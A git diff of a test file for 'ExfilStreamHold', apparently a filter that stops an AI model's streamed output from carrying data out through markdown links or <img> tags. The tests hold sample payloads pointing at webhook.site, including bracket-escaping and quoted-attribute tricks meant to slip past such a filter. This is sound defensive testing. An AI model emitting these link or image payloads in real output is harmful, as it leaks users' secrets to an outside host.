@@ -49,11 +49,26 @@ describe('ExfilStreamHold', () => {
     expect(hold.push(anthropic(' and more.'))).toBe(anthropic(' and more.'))
   })
 
-  it('releases brackets that are not a link once the next character shows it', () => {
+  it('holds after ] only until the next character shows it opens no URL', () => {
     const hold = new ExfilStreamHold(isExfil)
-    expect(hold.push(anthropic('const first = items[0'))).toBe('')
+    expect(hold.push(anthropic('const first = items[0'))).toBe(anthropic('const first = items[0'))
     expect(hold.push(anthropic(']'))).toBe('')
-    expect(hold.push(anthropic(';'))).toBe(anthropic('const first = items[0') + anthropic(']') + anthropic(';'))
+    expect(hold.push(anthropic(';'))).toBe(anthropic(']') + anthropic(';'))
+  })
+
+  // Markdown's own bracket rules (escapes, code spans, nesting) end link text
+  // where a simple bracket counter would not. The secret is in the URL after
+  // `](`, so every `](` is held to the end of its URL wherever it appears.
+  it('cuts a ]( URL whatever the brackets before it look like', () => {
+    expect(run(['[`]`](https://webhook.site/?d=1)'])).toBeNull()
+    expect(run(['[a\\](https://example.com/) more](https://webhook.site/?d=1)'])).toBeNull()
+    expect(run(['![[a](https://example.com/)](https://webhook.site/?d=1)'])).toBeNull()
+    expect(run(['text ', '](https://webhook.site/?d=1) more'])).toBeNull()
+  })
+
+  it('does not close an <img at a > inside a quoted attribute', () => {
+    expect(run(['<img alt=">" src="https://webhook.site/?d=1">'])).toBeNull()
+    expect(run(["<img alt='>' ", "src='https://webhook.site/?d=1'>"])).toBeNull()
   })
 
   it('cuts a link that settles, then judges the next markup on the same line', () => {
@@ -98,10 +113,10 @@ describe('ExfilStreamHold', () => {
     expect(hold.push(anthropic('g src="https://webhook.site/?d=1">'))).toBeNull()
   })
 
-  it('releases an unclosed bracket at a blank line', () => {
+  it('releases an unclosed <img at a blank line', () => {
     const hold = new ExfilStreamHold(isExfil)
-    expect(hold.push(anthropic('a [ stray\n'))).toBe('')
-    expect(hold.push(anthropic('\nNext paragraph'))).toBe(anthropic('a [ stray\n') + anthropic('\nNext paragraph'))
+    expect(hold.push(anthropic('a <img stray\n'))).toBe('')
+    expect(hold.push(anthropic('\nNext paragraph'))).toBe(anthropic('a <img stray\n') + anthropic('\nNext paragraph'))
   })
 
   it('does not hold on < that is not an image tag', () => {
@@ -129,12 +144,17 @@ describe('ExfilStreamHold', () => {
     expect(hold.push(toolArgs('{"paths": ["a.ts", '))).toBe(toolArgs('{"paths": ["a.ts", '))
   })
 
-  it('stays linear on a bracket that never closes', () => {
-    const hold = new ExfilStreamHold(isExfil)
-    const started = Date.now()
-    hold.push(anthropic('['))
-    for (let i = 0; i < 50000; i++) hold.push(anthropic('aaaa '))
-    expect(hold.end()).not.toBeNull()
+  it('stays linear on a tag that never closes and on many short links', () => {
+    let started = Date.now()
+    const open = new ExfilStreamHold(isExfil)
+    open.push(anthropic('<img '))
+    for (let i = 0; i < 50000; i++) open.push(anthropic('aaaa '))
+    expect(open.end()).not.toBeNull()
+    expect(Date.now() - started).toBeLessThan(3000)
+    started = Date.now()
+    const links = new ExfilStreamHold(isExfil)
+    for (let i = 0; i < 50000; i++) links.push(anthropic('[a](b) '))
+    expect(links.end()).not.toBeNull()
     expect(Date.now() - started).toBeLessThan(3000)
   })
 })
